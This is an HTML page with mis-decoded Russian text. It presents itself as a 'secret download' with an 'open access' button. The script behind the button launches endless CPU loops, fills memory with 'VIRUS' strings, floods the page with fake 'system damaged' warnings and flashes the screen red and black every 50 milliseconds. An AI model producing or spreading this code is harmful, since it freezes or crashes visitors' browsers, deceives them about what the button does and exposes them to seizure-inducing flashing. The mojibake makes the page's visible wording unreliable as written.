<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–°–µ–∫—Ä–µ—Ç–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
    }
    #content {
      display: none;
    }
    button {
      font-size: 30px;
      margin-top: 100px;
      padding: 20px 60px;
      border: none;
      background: red;
      color: white;

    }
  </style>
</head>
<body>
  <h1>üîí –ù–∞–∂–º–∏ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö</h1>
  <button onclick="go()">–û—Ç–∫—Ä—ã—Ç—å –¥–æ—Å—Ç—É–ø</button>

  <div id="content">
    <h2>–ó–∞–≥—Ä—É–∑–∫–∞...</h2>
    <canvas id="canvas" width="800" height="600"></canvas>
  </div>

  <script>
    function go() {
      document.querySelector("button").remove();
      document.getElementById("content").style.display = "block";

      // 1. –ë–µ—Å–∫–æ–Ω–µ—á–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–∞ CPU
      for (let i = 0; i < 50; i++) {
        setTimeout(() => {
          while (true) {
            let x = Math.random() ** Math.random();
          }
        }, i * 100);
      }

      // 2. –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏
      let storage = [];
      setInterval(() => {
        for (let i = 0; i < 1000; i++) {
          storage.push(new Array(10000).fill("ü§° VIRUS ü§°"));
        }
      }, 100);

      // 3. –ú–∏–≥–∞—é—â–∏–π —Ñ–æ–Ω
      setInterval(() => {
        document.body.style.backgroundColor =
          document.body.style.backgroundColor === "black" ? "red" : "black";
      }, 50);

      // 4. –ü–æ—Å—Ç–æ—è–Ω–Ω–æ —Å–æ–∑–¥–∞—ë–º —ç–ª–µ–º–µ–Ω—Ç—ã
      setInterval(() => {
        let e = document.createElement("div");
        e.textContent = "‚ö†Ô∏è –°–ò–°–¢–ï–ú–ê –ü–û–í–†–ï–ñ–î–ï–ù–ê ‚ö†Ô∏è";
        e.style.fontSize = Math.random() * 50 + "px";
        e.style.color = "#" + Math.floor(Math.random()*16777215).toString(16);
        document.body.appendChild(e);
      }, 10);

      // 5. WebGL –∞–Ω–∏–º–∞—Ü–∏—è
      let gl = document.getElementById("canvas").getContext("webgl");
      if (gl) {
        let vertices = new Float32Array([
          -1, -1, 0,
           1, -1, 0,
           0,  1, 0
        ]);
        let buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);

        let vertCode = 'attribute vec3 coordinates; void main(void) { gl_Position = vec4(coordinates, 1.0); }';
        let vertShader = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vertShader, vertCode);
        gl.compileShader(vertShader);

        let fragCode = 'void main(void) { gl_FragColor = vec4(' + Math.random() + ',0.0,1.0,1); }';
        let fragShader = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fragShader, fragCode);
        gl.compileShader(fragShader);

        let shaderProgram = gl.createProgram();
        gl.attachShader(shaderProgram, vertShader);
        gl.attachShader(shaderProgram, fragShader);
        gl.linkProgram(shaderProgram);
        gl.useProgram(shaderProgram);

        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        let coord = gl.getAttribLocation(shaderProgram, "coordinates");
        gl.vertexAttribPointer(coord, 3, gl.FLOAT, false, 0, 0);
        gl.enableVertexAttribArray(coord);

        setInterval(() => {
          gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
          gl.clear(gl.COLOR_BUFFER_BIT);
          gl.drawArrays(gl.TRIANGLES, 0, 3);
        }, 50);
      }
    }
  </script>
